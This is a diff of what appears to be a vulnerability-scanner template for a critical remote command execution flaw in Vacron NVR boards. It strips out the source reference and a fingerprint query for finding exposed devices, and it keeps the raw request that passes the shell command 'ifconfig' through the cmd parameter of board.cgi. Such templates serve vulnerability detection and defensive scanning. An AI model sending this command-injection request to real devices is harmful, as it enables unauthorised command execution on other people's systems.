@@ -3,12 +3,8 @@ info:
   name: Vacron NVR-board存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iiwpphdelhfrswcf'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: iiwpphdelhfrswcf
-    fofa: banner="DVR_NETRA" || body="vacron nvr login" || title="Vacron NVR" || body="<strong>VACRON</strong>"
 http:
 - raw:
   - GET /board.cgi?cmd=ifconfig HTTP/1.1
